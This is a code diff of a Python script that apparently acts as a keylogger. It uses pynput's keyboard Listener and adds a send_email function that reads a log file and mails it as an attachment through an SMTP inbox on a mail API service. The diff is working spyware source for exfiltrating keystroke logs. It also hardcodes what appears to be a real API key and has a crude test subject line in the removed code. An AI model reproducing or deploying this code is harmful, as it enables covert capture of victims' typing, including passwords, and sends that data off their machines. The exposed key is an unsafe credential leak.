@@ -1,3 +1,4 @@
+from email.message import EmailMessage
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -143,28 +144,33 @@ def on_release(key):
 with Listener(on_press=on_press,on_release=on_release) as listener:
     listener.join()
 
-
+def send_email():
 # create a mailslurp configuration
-configuration = mailslurp_client.Configuration()
-configuration.api_key['x-api-key'] = "40a688f9057922a582256f5b0ac396ebf21f194681ac2b9a0c6dbc521be79dbe" #change api
-with mailslurp_client.ApiClient(configuration) as api_client:
+    configuration = mailslurp_client.Configuration()
+    configuration.api_key['x-api-key'] = "40a688f9057922a582256f5b0ac396ebf21f194681ac2b9a0c6dbc521be79dbe" #change api
+    with mailslurp_client.ApiClient(configuration) as api_client:
     # create an inbox
-    inbox_controller = mailslurp_client.InboxControllerApi(api_client)
-    options = mailslurp_client.CreateInboxDto()
-    options.name = "data"
-    options.inbox_type="SMTP_INBOX"
-    inbox = inbox_controller.create_inbox_with_options(options)
-    print("email address is " + inbox.email_address)
+        inbox_controller = mailslurp_client.InboxControllerApi(api_client)
+        options = mailslurp_client.CreateInboxDto()
+        options.name = "data"
+        options.inbox_type="SMTP_INBOX"
+        inbox = inbox_controller.create_inbox_with_options(options)
+        #print("email address is " + inbox.email_address)
     
-access_details=inbox_controller.get_imap_smtp_access(inbox_id=inbox.id)
-print(access_details)
-print("sending")
-with SMTP(
-    host=access_details.smtp_server_host,
-    port= access_details.smtp_server_port,
-) as smtp:
-    msg="Subject: I LOVE COCK AND BALLS\r\n\r\nThis is my body" #have to add attachments 
-    smtp.login(user=access_details.smtp_username,password=access_details.smtp_password)
-    smtp.sendmail(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
-    smtp.quit()
-print("check your mail :)")
+    access_details=inbox_controller.get_imap_smtp_access(inbox_id=inbox.id)
+    with open("log.txt", 'rb') as f: #need to change log.txt to actual path
+        file_data=f.read() 
+        file_name=f.name
+    
+    #print(access_details)
+    #print("sending")
+    with SMTP(
+        host=access_details.smtp_server_host,
+        port= access_details.smtp_server_port,
+    ) as smtp:
+        msg= EmailMessage()
+        msg.add_attachment(file_data, maintype='text', subtype='plain',filename=file_name)
+        smtp.login(user=access_details.smtp_username,password=access_details.smtp_password)
+        smtp.send_message(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
+        smtp.quit()
+    #print("check your mail :)")
